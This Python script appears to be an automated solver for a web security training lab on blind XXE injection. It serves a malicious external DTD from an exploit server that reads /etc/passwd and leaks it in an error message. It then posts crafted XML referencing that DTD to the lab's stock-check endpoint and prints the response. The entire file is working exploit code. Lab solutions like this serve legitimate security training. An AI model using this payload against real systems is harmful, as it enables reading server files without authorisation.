from ...utils import *
from ...exploit_server import ExploitServer

from urllib.parse import urljoin
from lxml import etree

import requests


def solve_lab(url, proxies):
    exploit_server = ExploitServer(url, proxies)
    head = ["HTTP/1.0 200 OK", "Content-Type: text/xml; charset=utf-8"]
    body = [
        '<!ENTITY % file SYSTEM "file:///etc/passwd">',
        f"<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
        "%eval;",
        "%error;",
    ]
    exploit_server.craft_response("/malicious.dtd", "\n".join(head), "\n".join(body))

    url = urljoin(url, "/product/stock")

    doctype = f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{exploit_server.url}/malicious.dtd"> %xxe;]>'
    stock_check = etree.Element("stockCheck")
    etree.SubElement(stock_check, "productId").text = "1"
    etree.SubElement(stock_check, "storeId").text = "1"

    data = etree.tostring(
        stock_check, encoding="UTF-8", xml_declaration=True, doctype=doctype
    )
    data = data.decode()

    print_info(
        f'Injecting an XML external entity with the following POST request data to "{url}":\n'
    )
    print(f"{data}\n")

    resp = requests.post(url, proxies=proxies, verify=False, data=data)
    print_success("XXE injection successful with the following response:\n")
    print(f"{resp.text}\n")
